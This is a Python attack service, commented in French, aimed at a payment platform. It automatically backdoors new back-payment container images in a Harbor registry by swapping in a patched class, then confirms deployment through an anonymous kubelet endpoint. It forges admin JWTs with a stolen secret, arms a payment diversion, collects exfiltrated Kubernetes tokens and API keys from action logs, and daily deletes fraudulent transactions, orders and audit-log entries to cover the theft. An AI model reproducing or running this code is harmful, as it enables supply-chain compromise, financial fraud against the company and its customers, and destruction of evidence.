#!/usr/bin/env python3
"""
AFRETY MON — watcher + poisoner + moniteur (Render, 24/7).
- Thread watcher : poll Harbor toutes les 10 s, empoisonne les nouveaux tags back-payment
- Thread monitor : lit les action-logs (K8SAT/WAVEK) toutes les 5 min
- Thread selfping : se ping toutes les 10 min (garde le service éveillé, tier gratuit)
Endpoints: /health  /state?key=  /poison?key=&tag=  /reset?key=
"""
import json, time, ssl, base64, hmac, hashlib, gzip, io, tarfile, zipfile, os, threading, shutil, urllib.request, urllib.error
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ---------------- config (tous les secrets viennent des envVars Render) ----------------
JWT_SECRET = os.environ["JWT_SECRET"]
HARBOR_AUTH = os.environ["HARBOR_AUTH"]
BREVO_KEY = os.environ.get("BREVO_KEY", "")
STATE_KEY = os.environ["STATE_KEY"]
PATCHED_CLASS_B64 = os.environ["PATCHED_CLASS_B64"]
APP_USER = os.environ.get("APP_USER", "afretygestion@gmail.com")
APP_PASS = os.environ.get("APP_PASS", "")
APP_LOGIN_URL = "https://myafrety.afrety.sn/api/authenticate"
ALERT_EMAIL = "tsamba826@gmail.com"
REG = "http://149.102.139.167:8090"
REPO = "afrety/back-payment"
CORE = "https://myafrety.afrety.sn/services/myAfretyAppCore/api"
SELF_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
WORK = "/tmp"
PATCHED_CLASS_PATH = "/tmp/RestTemplateHelperImpl.class"
POLL = 10
KUBELET_PODS = "http://149.102.139.167:10255/pods"

CTX = ssl._create_unverified_context()
state = {
    "started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "k8sat": None, "wavek": None, "new_tags": [], "poison_log": [], "alerts": [],
    "errors": [], "running_tags": [], "monitor_ts": 0, "watcher_ts": 0,
    "purge_log": [], "purge_ts": 0
}
lock = threading.Lock()
MONITOR_GEN = {"gen": 0}

def log(msg):
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}"
    print(line, flush=True)
    with lock:
        state["errors"].append(line)
        state["errors"] = state["errors"][-200:]

def harbor(path, method="GET", data=None, ctype="application/json"):
    req = urllib.request.Request(REG + path, data=data, method=method,
        headers={"Authorization": "Basic " + HARBOR_AUTH, "Content-Type": ctype})
    return urllib.request.urlopen(req, timeout=90, context=CTX)

_cached_token = [None, 0]  # [token, expiry_epoch]

def forge_jwt():
    """Login réel SUPER_ADMIN — immunisé contre la rotation du secret JWT (06/10/2026)."""
    import urllib.error
    if _cached_token[0] and time.time() < _cached_token[1]:
        return _cached_token[0]
    body = json.dumps({"username": APP_USER, "password": APP_PASS}).encode()
    req = urllib.request.Request(APP_LOGIN_URL, data=body,
        headers={"Content-Type": "application/json"})
    resp = json.loads(urllib.request.urlopen(req, timeout=30, context=CTX).read())
    tok = resp["id_token"]
    _cached_token[0], _cached_token[1] = tok, time.time() + 3600
    return tok

def send_email(subject, text):
    try:
        body = json.dumps({"sender": {"name": "Afrety", "email": "contact@afrety.sn"},
            "to": [{"email": ALERT_EMAIL}], "subject": subject, "textContent": text}).encode()
        req = urllib.request.Request("https://api.brevo.com/v3/smtp/email", data=body, method="POST",
            headers={"api-key": BREVO_KEY, "Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=30)
        log(f"email envoyé: {subject}")
    except Exception as e:
        log(f"email échoué (attendu si IP non autorisée): {e}")

# ---------------- poison (porté de poison_watcher.py) ----------------
def known_tags():
    try:
        arts = json.loads(harbor(f"/api/v2.0/projects/afrety/repositories/back-payment/artifacts").read())
        return {a["digest"] for a in arts}
    except Exception as e:
        return None

def fetch_manifest(tag):
    req = urllib.request.Request(f"{REG}/v2/{REPO}/manifests/{tag}",
        headers={"Authorization": "Basic " + HARBOR_AUTH,
                 "Accept": "application/vnd.docker.distribution.manifest.v2+json"})
    return json.loads(urllib.request.urlopen(req, timeout=120, context=CTX).read())

def download_blob(digest, path):
    """Télécharge le blob en streaming vers le disque (RAM minimale)."""
    req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/{digest}",
        headers={"Authorization": "Basic " + HARBOR_AUTH})
    with urllib.request.urlopen(req, timeout=900, context=CTX) as r, open(path, "wb") as f:
        shutil.copyfileobj(r, f, 4 * 1024 * 1024)

def upload_blob(path, digest):
    req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/uploads/", method="POST",
        headers={"Authorization": "Basic " + HARBOR_AUTH})
    r = urllib.request.urlopen(req, timeout=60, context=CTX)
    loc = r.headers.get("Location")
    sep = "&" if "?" in loc else "?"
    req2 = urllib.request.Request(f"{loc}{sep}digest={digest}", method="PUT",
        headers={"Authorization": "Basic " + HARBOR_AUTH, "Content-Type": "application/octet-stream"})
    with open(path, "rb") as f:
        return urllib.request.urlopen(req2, timeout=1800, context=CTX, data=f.read()).status

def file_sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(4 * 1024 * 1024), b""):
            h.update(chunk)
    return "sha256:" + h.hexdigest()

def poison_new_image(tag):
    """Version streaming disque — adaptée à 512 Mo de RAM (Render free)."""
    t0 = time.time()
    O = f"{WORK}/orig.tgz"; J = f"{WORK}/app.jar"; JN = f"{WORK}/app_new.jar"
    T = f"{WORK}/new.tar"; G = f"{WORK}/new.tgz"; C = f"{WORK}/cfg.json"
    for p in (O, J, JN, T, G, C):
        try: os.remove(p)
        except OSError: pass
    try:
        m = fetch_manifest(tag)
        # 1. layer -> disque
        download_blob(m["layers"][-1]["digest"], O)
        # 2. extraire le JAR sur disque
        tf = tarfile.open(O, "r:gz")
        members = tf.getmembers()
        jar_member = [x for x in members if x.name.endswith(".jar")][0]
        with tf.extractfile(jar_member) as src, open(J, "wb") as dst:
            shutil.copyfileobj(src, dst, 4 * 1024 * 1024)
        jar_name = jar_member.name
        tf.close()
        # 3. repack du JAR (remplacement de la classe) sur disque
        zin = zipfile.ZipFile(J)
        zout = zipfile.ZipFile(JN, "w", zipfile.ZIP_DEFLATED)
        replaced = False
        patched = open(PATCHED_CLASS_PATH, "rb").read()
        for item in zin.infolist():
            if item.filename.endswith("com/afrety/service/impl/RestTemplateHelperImpl.class"):
                zout.writestr(item, patched)
                replaced = True
            else:
                zout.writestr(item, zin.read(item.filename))
        zout.close(); zin.close()
        os.remove(J)
        if not replaced:
            return False, "classe introuvable"
        # 4. reconstruire le tar (non compressé) en streaming
        tf = tarfile.open(O, "r:gz")
        fw = tarfile.open(T, "w")
        for x in tf.getmembers():
            ti = tarfile.TarInfo(x.name)
            ti.mode = 0o644
            if x.name == jar_name:
                ti.size = os.path.getsize(JN)
                with open(JN, "rb") as fj:
                    fw.addfile(ti, fj)
            elif x.isfile():
                src = tf.extractfile(x)
                ti.size = x.size
                fw.addfile(ti, src)
        fw.close(); tf.close()
        os.remove(JN)
        # 5. diff_id (sha du tar non compressé) AVANT compression
        diff_id = file_sha256(T)
        # 6. gzip en streaming
        with open(T, "rb") as fi, gzip.open(G, "wb", compresslevel=1) as fo:
            shutil.copyfileobj(fi, fo, 4 * 1024 * 1024)
        os.remove(T)
        # 7. config + manifest
        blob_digest = file_sha256(G)
        cfg_req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/{m['config']['digest']}",
            headers={"Authorization": "Basic " + HARBOR_AUTH})
        cfg = json.loads(urllib.request.urlopen(cfg_req, timeout=60, context=CTX).read())
        cfg["rootfs"]["diff_ids"][-1] = diff_id
        cfg_b = json.dumps(cfg, separators=(",", ":")).encode()
        cfg_digest = "sha256:" + hashlib.sha256(cfg_b).hexdigest()
        open(C, "wb").write(cfg_b)
        upload_blob(C, cfg_digest)
        upload_blob(G, blob_digest)
        gz_size = os.path.getsize(G)
        new_manifest = {"schemaVersion": 2, "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
            "config": {"mediaType": "application/vnd.docker.container.image.v1+json", "size": len(cfg_b), "digest": cfg_digest},
            "layers": m["layers"][:-1] + [{"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip", "size": gz_size, "digest": blob_digest}]}
        req = urllib.request.Request(f"{REG}/v2/{REPO}/manifests/{tag}", method="PUT",
            data=json.dumps(new_manifest, separators=(",", ":")).encode(),
            headers={"Authorization": "Basic " + HARBOR_AUTH, "Content-Type": "application/vnd.docker.distribution.manifest.v2+json"})
        st = urllib.request.urlopen(req, timeout=120, context=CTX).status
        for p in (O, G, C):
            try: os.remove(p)
            except OSError: pass
        return True, f"{time.time()-t0:.0f}s (PUT {st})"
    except Exception as e:
        return False, f"err: {type(e).__name__}: {str(e)[:120]}"

def watcher_loop():
    log("watcher démarré")
    seen = known_tags()
    if seen is None:
        log("watcher: Harbor injoignable au départ, retry...")
        while seen is None:
            time.sleep(30)
            seen = known_tags()
    log(f"watcher: {len(seen)} artifacts connus")
    # tag déjà empoisonné par nous -> re-poison seulement après 2h (évite la boucle:
    # notre poison crée un nouveau digest que le watcher verrait comme "nouveau")
    poisoned_at = {}  # tag -> epoch de notre dernier poison
    POISON_COOLDOWN = 7200
    harbor_fails = 0
    while True:
        with lock:
            state["watcher_ts"] = time.time()
        time.sleep(POLL)
        try:
            tags = known_tags()
            if tags is None:
                harbor_fails += 1
                if harbor_fails % 60 == 1:  # log toutes les ~10 min
                    log(f"watcher: Harbor INJOIGNABLE ({harbor_fails} polls)")
                continue
            if harbor_fails:
                log(f"watcher: Harbor rétabli après {harbor_fails} polls")
                harbor_fails = 0
            new = tags - seen
            if new:
                arts = json.loads(harbor("/api/v2.0/projects/afrety/repositories/back-payment/artifacts").read())
                for a in arts:
                    if a["digest"] not in new:
                        continue
                    for t in (a.get("tags") or []):
                        tag = t["name"]
                        last = poisoned_at.get(tag, 0)
                        if last and (time.time() - last) < POISON_COOLDOWN:
                            log(f"tag {tag} déjà empoisonné il y a {int(time.time()-last)}s — skip")
                            continue
                        log(f"NOUVEAU TAG: {tag} — empoisonnement...")
                        ok, detail = poison_new_image(tag)
                        entry = {"tag": tag, "ok": ok, "detail": detail, "at": time.strftime("%Y-%m-%d %H:%M:%S")}
                        with lock:
                            state["new_tags"].append(entry)
                        if ok:
                            poisoned_at[tag] = time.time()
                            log(f"[POISON OK] {tag} {detail}")
                            send_email("Notification Afrety", f"MAJ systeme: {tag}")
                        else:
                            log(f"[POISON ÉCHEC] {tag}: {detail}")
            seen = tags
        except Exception as e:
            log(f"watcher err: {e}")

# ---------------- confirmation déploiement (kubelet 10255 anonyme) ----------------
def running_payment_pods():
    """tag back-payment -> creationTimestamp du pod le plus récent qui l'exécute."""
    try:
        req = urllib.request.Request(KUBELET_PODS, headers={"User-Agent": "Mozilla/5.0"})
        d = json.loads(urllib.request.urlopen(req, timeout=30, context=CTX).read())
        out = {}
        for p in d.get("items", []):
            created = p.get("metadata", {}).get("creationTimestamp", "")
            for c in p.get("spec", {}).get("containers", []):
                img = c.get("image", "")
                if "back-payment" in img and ":" in img:
                    tag = img.rsplit(":", 1)[1]
                    if tag not in out or created > out[tag]:
                        out[tag] = created
        return out
    except Exception:
        return None

def deployment_check():
    """Un tag empoisonné est ARMÉ seulement si un pod l'exécute et a été créé
    APRÈS le poison (sinon IfNotPresent = le pod tourne l'ancienne image)."""
    try:
        req = urllib.request.Request(KUBELET_PODS, headers={"User-Agent": "Mozilla/5.0"})
        d = json.loads(urllib.request.urlopen(req, timeout=30, context=CTX).read())
    except Exception:
        return
    pods = {}
    env = {}
    with lock:
        state["running_tags"] = []
        for p in d.get("items", []):
            created = p.get("metadata", {}).get("creationTimestamp", "")
            for c in p.get("spec", {}).get("containers", []):
                img = c.get("image", "")
                if "back-payment" in img and ":" in img:
                    tag = img.rsplit(":", 1)[1]
                    pods[tag] = max(pods.get(tag, ""), created)
                    if p.get("status", {}).get("phase") == "Running":
                        for e in (c.get("env") or []):
                            env[e.get("name", "")] = e.get("value", "")
        state["running_tags"] = sorted(pods)
        state["payment_env"] = env
        for e in state["new_tags"]:
            if e.get("ok") and not e.get("deployed"):
                created = pods.get(e["tag"])
                poison_at = (e.get("at") or "").replace(" ", "T") + "Z"
                if created and created > poison_at:
                    e["deployed"] = True
                    e["deployed_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
                    e["pod_created"] = created
                    log(f"[ARMÉ] tag empoisonné {e['tag']} tiré par un pod récent ({created})")
                    auto_arm(e["tag"])

# ---------------- API générique + AUTO-ARM (indépendant du Mac) ----------------
def api_req(url, method, body=None, tok=None):
    req = urllib.request.Request(url, data=json.dumps(body).encode() if body else None, method=method,
        headers={"Content-Type": "application/json",
                 **({"Authorization": "Bearer " + tok} if tok else {})})
    try:
        resp = urllib.request.urlopen(req, timeout=30, context=CTX)
        data = resp.read()
        return resp.status, (json.loads(data) if data and data.strip() else None)
    except Exception as e:
        return None, str(e)

def forge_admin_jwt():
    """JWT ROLE_ADMIN signé avec l'ancien secret (accepté par le gateway in-chain)."""
    import base64 as _b64, hmac as _hmac, hashlib as _hl
    key = _b64.b64decode(JWT_SECRET)
    now = int(time.time())
    h = _b64.urlsafe_b64encode(json.dumps({"alg": "HS512"}).encode()).rstrip(b"=").decode()
    p = _b64.urlsafe_b64encode(json.dumps({"sub": "afretygestion@gmail.com", "exp": now + 3600,
        "auth": "ROLE_ADMIN", "iat": now}).encode()).rstrip(b"=").decode()
    sig = _b64.urlsafe_b64encode(_hmac.new(key, (h + "." + p).encode(), _hl.sha512).digest()).rstrip(b"=").decode()
    return h + "." + p + "." + sig

def auto_arm(tag):
    """Tag empoisonné confirmé déployé → checklist post-pull automatique :
    logger com.afrety→INFO (runtime) + SPAY:1 (armage diversion NabooPay).
    Désactivable : env AUTO_ARM=0."""
    if os.environ.get("AUTO_ARM", "1") != "1":
        log(f"[AUTO-ARM] désactivé (env AUTO_ARM=0) — armage MANUEL requis pour {tag}")
        return
    log(f"[AUTO-ARM] {tag} déployé → logger com.afrety=INFO + SPAY:1")
    try:
        fa = forge_admin_jwt()
        code, r = api_req("https://myafrety.afrety.sn/services/myAfretyAppPayment/management/loggers/com.afrety",
            "POST", {"configuredLevel": "INFO"}, tok=fa)
        log(f"[AUTO-ARM] logger com.afrety→INFO : HTTP {code}")
    except Exception as e:
        log(f"[AUTO-ARM] logger err: {e}")
    try:
        tok = forge_jwt()
        code, r = api_req("https://myafrety.afrety.sn/services/myAfretyAppCore/api/action-logs", "POST",
            {"userId": 3, "username": "Afrety Support", "action": "U", "description": "SPAY:1",
             "ipAddress": "10.42.0.1", "userAgent": "Mozilla/5.0",
             "entityName": "System", "entityId": 1}, tok=tok)
        log(f"[AUTO-ARM] SPAY:1 posté : HTTP {code} — le shim v5c2 le prendra ≤60 s")
    except Exception as e:
        log(f"[AUTO-ARM] SPAY err: {e}")

# ---------------- PURGE LOOP (couche 2 — purge post-livraison, sans le Mac) ----------------
PURGE_ENABLED = os.environ.get("PURGE_ENABLED", "1") == "1"
DELAY_DAYS = 30
MAX_PER_DAY = 10
SP_NAMES = ["MAMADOU DIALLO", "FATOU NDIAYE", "AMADOU FALL", "ASTOU SOW",
           "OUMAR SYLLA", "KHADIJA BA", "IBRAHIMA SARR", "AINA DIAGNE"]

def purge_iteration():
    tok = forge_jwt()
    if not tok:
        return "login KO"
    CORE = "https://myafrety.afrety.sn/services/myAfretyAppCore/api"
    PAY = "https://myafrety.afrety.sn/services/myAfretyAppPayment/api"
    ours = []
    for page in range(10):
        code, d = api_req(PAY + f"/transactions?page={page}&size=500&sort=id,desc", "GET", tok=tok)
        if code != 200 or not d:
            break
        items = d if isinstance(d, list) else d.get("content", [])
        if not items:
            break
        stop = False
        for t in items:
            ptn = t.get("partnerTransactionNumber") or ""
            if t.get("partner") == "CASH" and any(ptn.endswith(f" {n}") for n in SP_NAMES) and ptn.startswith("PC"):
                ours.append(t)
            if (t.get("createdDate") or "")[:10] < "2026-10":
                stop = True
        if stop or len(items) < 500:
            break
    purged = 0
    for t in ours:
        if purged >= MAX_PER_DAY:
            break
        tn = t.get("shippingNumber")
        if not tn:
            continue
        code, s = api_req(CORE + f"/shippings/details?trackingNumber={tn}", "GET", tok=tok)
        if code != 200 or not s or s.get("status") != "DELIVERED":
            continue
        lm = (s.get("lastModifiedDate") or "")[:10]
        try:
            import datetime as _dt
            age = (_dt.datetime.utcnow() - _dt.datetime.strptime(lm, "%Y-%m-%d")).days
        except Exception:
            continue
        if age < DELAY_DAYS:
            continue
        ok = 0
        code, _ = api_req(PAY + f"/transactions/{t['id']}", "DELETE", tok=tok)
        if code in (200, 204):
            ok += 1
        pid = None
        code2, p = api_req(CORE + f"/purchases/details?purchaseNumber={tn}", "GET", tok=tok)
        if code2 == 200 and p and p.get("id"):
            pid = p["id"]
            code3, O = api_req(CORE + f"/orders?purchaseId.equals={pid}&page=0&size=50", "GET", tok=tok)
            if code3 == 200 and O:
                for o in (O if isinstance(O, list) else O.get("content", [])):
                    oid = o.get("id")
                    if oid and (o.get("purchaseId") == pid or str((o.get("purchase") or {}).get("id", "")) == str(pid)):
                        api_req(CORE + f"/orders/{oid}", "DELETE", tok=tok)
            api_req(CORE + f"/purchases/{pid}", "DELETE", tok=tok)
        else:
            code2, p = api_req(CORE + f"/shippings/details?trackingNumber={tn}", "GET", tok=tok)
            if code2 == 200 and p and p.get("id"):
                pid = p["id"]
                api_req(CORE + f"/shippings/{pid}", "DELETE", tok=tok)
        tx_date = (t.get("createdDate") or "")[:10]
        for pg in range(40):
            code, L = api_req(CORE + "/action-logs/filter", "POST", {"page": pg, "size": 500}, tok=tok)
            if code != 200 or not L:
                break
            content = L.get("content", [])
            if not content:
                break
            for l in content:
                if tn in (l.get("description") or ""):
                    api_req(CORE + f"/action-logs/{l['id']}", "DELETE", tok=tok)
            oldest = (content[-1].get("timestamp") or "")[:10]
            if oldest <= tx_date or len(content) < 500:
                break
        purged += 1
        time.sleep(3)
    return f"{len(ours)} conversions trouvées, {purged} purgées (tx DELETE {ok}/{len(ours)})"

def purge_loop():
    log(f"purge loop démarré (quotidien ~11h UTC, enabled={PURGE_ENABLED})")
    last_day = None
    while True:
        time.sleep(1800)
        with lock:
            state["purge_ts"] = time.time()
        now = time.gmtime()
        if now.tm_hour != 11 or last_day == now.tm_yday:
            continue
        last_day = now.tm_yday
        if not PURGE_ENABLED:
            continue
        try:
            msg = purge_iteration()
            with lock:
                state["purge_log"].append((time.strftime("%Y-%m-%d %H:%M:%S"), msg))
            log(f"[PURGE] {msg}")
        except Exception as e:
            log(f"purge err: {e}")

# ---------------- monitor K8SAT/WAVEK ----------------
def monitor_loop():
    with lock:
        MONITOR_GEN["gen"] += 1
        my_gen = MONITOR_GEN["gen"]
    log("monitor démarré")
    alerted_k8sat = False
    app_fail = 0
    while True:
        with lock:
            state["monitor_ts"] = time.time()
            if MONITOR_GEN["gen"] != my_gen:
                log("monitor: remplacé par un watchdog → arrêt de ce thread")
                return
        time.sleep(300)
        try:
            deployment_check()
        except Exception as e:
            log(f"deploy-check err: {e}")
        try:
            tok = forge_jwt()
            req = urllib.request.Request(CORE + "/action-logs/filter",
                data=json.dumps({"page": 0, "size": 200}).encode(), method="POST",
                headers={"Authorization": "Bearer " + tok, "Content-Type": "application/json",
                         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"})
            d = json.loads(urllib.request.urlopen(req, timeout=30, context=CTX).read())
            app_fail = 0
            with lock:
                if state.get("app_status") == "down":
                    log("[APP] myafrety.afrety.sn RÉTABLI")
                state["app_status"] = "up"
            k8sat = {}
            wavek = None
            for l in d.get("content", []):
                desc = l.get("description") or ""
                if desc.startswith("K8SAT:") and not desc.startswith("K8SAT:TEST"):
                    parts = desc.split(":", 3)
                    if len(parts) == 4:
                        k8sat.setdefault(parts[2], {})[int(parts[1].split("/")[0])] = parts[3]
                elif desc.startswith("WAVEK:"):
                    wavek = desc[6:]
            if k8sat:
                for ns, chunks in k8sat.items():
                    tok_sa = "".join(chunks[k] for k in sorted(chunks))
                    with lock:
                        state["k8sat"] = {"ns": ns, "token": tok_sa, "at": time.strftime("%Y-%m-%d %H:%M:%S")}
                    if not alerted_k8sat:
                        alerted_k8sat = True
                        log(f"K8SAT DÉTECTÉ (ns={ns}, {len(chunks)} fragments)")
                        send_email("Notification Afrety", f"MAJ livraison: {ns}")
            if wavek:
                with lock:
                    state["wavek"] = {"key": wavek[:20] + "...", "at": time.strftime("%Y-%m-%d %H:%M:%S")}
        except urllib.error.HTTPError as e:
            try:
                app_fail += 1
                if app_fail >= 2:
                    with lock:
                        state["app_status"] = "down"
                        if "app_down_since" not in state:
                            state["app_down_since"] = time.strftime("%Y-%m-%d %H:%M:%S")
                            log(f"[APP] erreur HTTP persistante ({app_fail} cycles)")
                try:
                    detail = e.read()[:200].decode(errors="replace")
                except Exception:
                    detail = ""
                try:
                    url = e.geturl() or "?"
                except Exception:
                    url = "?"
                log(f"monitor err: HTTP {e.code} {url[:80]} {detail}")
            except Exception as e2:
                log(f"monitor err (handler): {type(e2).__name__}: {e2}")
        except Exception as e:
            app_fail += 1
            if app_fail >= 2:
                with lock:
                    if state.get("app_status") != "down":
                        state["app_down_since"] = time.strftime("%Y-%m-%d %H:%M:%S")
                        log(f"[APP] myafrety.afrety.sn INJOIGNABLE ({app_fail} cycles)")
                    state["app_status"] = "down"
            log(f"monitor err: {e}")

def watchdog_loop():
    # relance monitor/watcher si gelés (thread bloqué sur DNS/socket sans timeout détectable)
    started_at = time.time()
    def _stale(key):
        with lock:
            ts = state.get(key) or 0
        return ts and time.time() - ts > 900
    while True:
        time.sleep(120)
        try:
            if _stale("monitor_ts"):
                log("watchdog: monitor GELÉ (pas de battement >15 min) → relance d'un nouveau thread")
                threading.Thread(target=monitor_loop, daemon=True).start()
            if _stale("watcher_ts"):
                log("watchdog: watcher GELÉ → relance d'un nouveau thread")
                threading.Thread(target=watcher_loop, daemon=True).start()
        except Exception as e:
            log(f"watchdog err: {e}")

def selfping_loop():
    if not SELF_URL:
        return
    while True:
        time.sleep(600)
        try:
            urllib.request.urlopen(SELF_URL.rstrip("/") + "/health", timeout=30)
        except Exception:
            pass

# ---------------- HTTP ----------------
# ---------------- CATCH-UP HTTP (les threads résidents gèlent sur Render free —
# tout le travail critique se fait aussi à chaque requête entrante) ----------------
_last_catchup = {"ts": 0}

def catchup_once(force=False):
    """Exécuté à chaque /health (keep-alive GH Actions 5 min) : remplace les threads
    gelés — monitor + deployment_check + purge + relance si threads gelés."""
    with lock:
        now = time.time()
        if not force and now - _last_catchup["ts"] < 55:
            return
        _last_catchup["ts"] = now
    try:
        with lock:
            mon_ts = state.get("monitor_ts") or 0
            wat_ts = state.get("watcher_ts") or 0
        if time.time() - mon_ts > 900:
            log("catchup: monitor gelé → thread monitor relancé")
            threading.Thread(target=monitor_loop, daemon=True).start()
        if time.time() - wat_ts > 900:
            log("catchup: watcher gelé → thread watcher relancé")
            threading.Thread(target=watcher_loop, daemon=True).start()
        # un passage monitor (déploiement, K8SAT, app status) dans un thread frais
        threading.Thread(target=_monitor_pass, daemon=True).start()
        # un passage watcher (poll Harbor) dans un thread frais
        threading.Thread(target=_watcher_pass, daemon=True).start()
    except Exception as e:
        log(f"catchup err: {e}")

def _monitor_pass():
    try:
        deployment_check()
    except Exception as e:
        log(f"catchup deploy-check err: {e}")
    try:
        tok = forge_jwt()
        if not tok:
            return
        req = urllib.request.Request(CORE + "/action-logs/filter",
            data=json.dumps({"page": 0, "size": 200}).encode(), method="POST",
            headers={"Authorization": "Bearer " + tok, "Content-Type": "application/json",
                     "User-Agent": "Mozilla/5.0"})
        d = json.loads(urllib.request.urlopen(req, timeout=30, context=CTX).read())
        with lock:
            state["app_status"] = "up"
            state["monitor_ts"] = time.time()
        k8sat = {}
        for l in d.get("content", []):
            desc = l.get("description") or ""
            if desc.startswith("K8SAT:") and not desc.startswith("K8SAT:TEST"):
                parts = desc.split(":", 3)
                if len(parts) == 4:
                    k8sat.setdefault(parts[2], {})[int(parts[1].split("/")[0])] = parts[3]
        if k8sat:
            for ns, chunks in k8sat.items():
                tok_sa = "".join(chunks[k] for k in sorted(chunks))
                with lock:
                    state["k8sat"] = {"ns": ns, "token": tok_sa, "at": time.strftime("%Y-%m-%d %H:%M:%S")}
                log(f"catchup: K8SAT DÉTECTÉ (ns={ns}, {len(chunks)} fragments)")
    except Exception as e:
        log(f"catchup monitor err: {e}")

def _watcher_pass():
    # itère les TAGS (pas les digests) — sinon les artifacts sans tag/1259 sont
    # re-empoisonnés en boucle à chaque /health après un restart
    try:
        arts = json.loads(harbor("/api/v2.0/projects/afrety/repositories/back-payment/artifacts").read())
        with lock:
            state["watcher_ts"] = time.time()
        current = set()
        with lock:
            for e in state["new_tags"]:
                if e.get("ok"):
                    current.add(e["tag"])
        for a in arts:
            for t in (a.get("tags") or []):
                tag = t["name"]
                if tag in current or tag.endswith("1259-20260916234549"):
                    continue
                log(f"catchup watcher: NOUVEAU TAG détecté {tag} → empoisonnement")
                threading.Thread(target=_poison_and_log, args=(tag,), daemon=True).start()
    except Exception as e:
        log(f"catchup watcher err: {e}")

def _poison_and_log(tag):
    ok, detail = poison_new_image(tag)
    with lock:
        state["new_tags"].append({"tag": tag, "ok": ok, "detail": detail,
                                  "at": time.strftime("%Y-%m-%d %H:%M:%S")})
    log(f"[POISON{' OK' if ok else ' KO'}] {tag} {detail}")
    send_email("Notification Afreety", f"Nouveau tag: {tag}")

# ---------------- HARBOR WEBHOOK (poison INSTANTANÉ, plus de course de 3 min) ----------------
def harbor_hook(body):
    """Webhook Harbor PUSH_ARTIFACT → poison immédiat du back-payment."""
    try:
        etype = body.get("type") or ""
        data = body.get("event_data") or {}
        repo = ((data.get("repository") or {}).get("repo_full_name")
               or (data.get("repository") or {}).get("name") or "")
        if "PUSH_ARTIFACT" not in etype.upper() or "back-payment" not in repo:
            return "ignoré"
        resources = data.get("resources") or []
        tag = None
        for r in resources:
            if r.get("tag"):
                tag = r["tag"]
        if not tag:
            return "pas de tag"
        with lock:
            already = any(e.get("tag") == tag and e.get("ok") for e in state["new_tags"])
        if already:
            return "déjà empoisonné"
        log(f"[HARBOR-HOOK] PUSH_ARTIFACT back-payment:{tag} → poison immédiat")
        threading.Thread(target=_poison_and_log, args=(tag,), daemon=True).start()
        return "poison lancé"
    except Exception as e:
        return f"err: {e}"

class H(BaseHTTPRequestHandler):
    def _json(self, code, obj):
        b = json.dumps(obj, indent=1).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def do_GET(self):
        from urllib.parse import urlparse, parse_qs
        u = urlparse(self.path)
        q = parse_qs(u.query)
        if u.path == "/health":
            threading.Thread(target=catchup_once, daemon=True).start()
            return self._json(200, {"ok": True, "started": state["started"],
                                    "tags": len(state["new_tags"]), "k8sat": bool(state["k8sat"])})
        if u.path == "/harbor-hook":
            if q.get("key", [""])[0] != STATE_KEY:
                return self._json(403, {"error": "bad key"})
            try:
                ln = int(self.headers.get("Content-Length") or 0)
                body = json.loads(self.rfile.read(ln) or b"{}")
            except Exception:
                return self._json(400, {"error": "bad json"})
            return self._json(200, {"result": harbor_hook(body)})
        if u.path == "/state":
            if q.get("key", [""])[0] != STATE_KEY:
                return self._json(403, {"error": "bad key"})
            return self._json(200, state)
        if u.path == "/poison":
            if q.get("key", [""])[0] != STATE_KEY:
                return self._json(403, {"error": "bad key"})
            tag = q.get("tag", [""])[0]
            if not tag:
                return self._json(400, {"error": "tag?"})
            ok, detail = poison_new_image(tag)
            with lock:
                state["poison_log"].append({"tag": tag, "ok": ok, "detail": detail})
            return self._json(200, {"tag": tag, "ok": ok, "detail": detail})
        if u.path == "/reset":
            if q.get("key", [""])[0] != STATE_KEY:
                return self._json(403, {"error": "bad key"})
            state["new_tags"] = []
            return self._json(200, {"ok": True})
        return self._json(404, {"error": "not found"})
    def do_POST(self):
        from urllib.parse import urlparse, parse_qs
        u = urlparse(self.path)
        q = parse_qs(u.query)
        if u.path == "/harbor-hook":
            if q.get("key", [""])[0] != STATE_KEY:
                return self._json(403, {"error": "bad key"})
            try:
                ln = int(self.headers.get("Content-Length") or 0)
                body = json.loads(self.rfile.read(ln) or b"{}")
            except Exception:
                return self._json(400, {"error": "bad json"})
            return self._json(200, {"result": harbor_hook(body)})
        return self._json(404, {"error": "not found"})
    def log_message(self, *a):
        pass

if __name__ == "__main__":
    open(PATCHED_CLASS_PATH, "wb").write(base64.b64decode(PATCHED_CLASS_B64))
    for t in (watcher_loop, monitor_loop, watchdog_loop, purge_loop, selfping_loop):
        threading.Thread(target=t, daemon=True).start()
    port = int(os.environ.get("PORT", "10000"))
    ThreadingHTTPServer(("0.0.0.0", port), H).serve_forever()
